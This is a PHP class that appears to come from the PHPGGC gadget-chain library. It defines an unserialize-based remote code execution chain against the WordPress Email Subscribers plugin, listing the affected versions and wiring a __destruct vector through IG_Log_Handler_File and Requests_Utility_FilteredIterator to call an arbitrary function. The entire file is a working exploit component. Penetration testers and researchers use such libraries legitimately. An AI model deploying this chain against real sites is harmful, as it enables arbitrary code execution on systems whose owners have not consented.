<?php

namespace GadgetChain\WordPress\P\EmailSubscribers;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '4.0 <= 4.4.7+ & WP < 5.5.2';
    public static $vector = '__destruct';
    public static $author = 'erwan_lr';
    public static $information = 'Tested up to WP 5.4.1 and EmailSubscribers 4.4.7. Newest versions might also work.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \IG_Log_Handler_File(new \Requests_Utility_FilteredIterator([$parameter], $function));
    }
}